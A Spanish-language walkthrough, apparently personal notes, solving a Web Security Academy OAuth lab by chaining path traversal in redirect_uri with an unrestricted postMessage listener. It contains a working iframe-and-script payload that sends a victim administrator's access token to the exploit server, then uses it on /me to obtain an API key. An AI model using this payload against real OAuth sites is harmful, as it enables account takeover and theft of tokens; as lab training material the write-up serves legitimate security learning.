En esta clase final, se combina todo lo aprendido para construir un exploit completo. Se crea un iframe que inicia el flujo OAuth con el **redirect_uri** apuntando al formulario de comentarios vulnerable, el cual reflejará el token en su propiedad ‘**location.href**‘.

Debajo del iframe, se implementa un script que escucha eventos **message** desde el iframe, y envía los datos recibidos (incluyendo el token) como una petición al exploit server. Esto permite registrar en el access log el token de acceso del administrador.

Una vez recibido el token, se utiliza en el endpoint **/me** del blog para realizar una petición autenticada como el administrador. La respuesta devuelve los datos personales y la API key, la cual se emplea para resolver el laboratorio.

Este ejercicio demuestra cómo una combinación de path traversal, comportamiento de proxy inseguro y falta de restricciones en postMessage puede comprometer por completo una cuenta privilegiada en un entorno OAuth.

Solucion
Vamos a crear un script en nuestro exploit server
para hacer el iframe hay que inteceptar despues de deslogearnos y en el apartado de carga es ahi donde interceptamos vamos a poner el host y la parte de arriba y vamos a poner despues del callback el (/../post/comment/comment-form)
![[Pasted image 20250830193959.png]]
<'iframe src="https://oauth-0aab00270358900a80603d6d028500d5.oauth-server.net/auth?client_id=g2x5o5192ufzif2j33ser&redirect_uri=https://0ad9005203d590bb80333f79006900eb.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=1641080511&scope=openid%20profile%20email"></iframe'>

<script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>
![[Pasted image 20250830194353.png]]
 le damos store enviamos a la victima y miramos los acces log recargando y vemos el access token 
![[Pasted image 20250830194512.png]]
lo pegamos en el authorization y le damos send
![[Pasted image 20250830194554.png]]
y ya solo copiamos la api key y pegamos en la pagina
![[Pasted image 20250830194626.png]]

 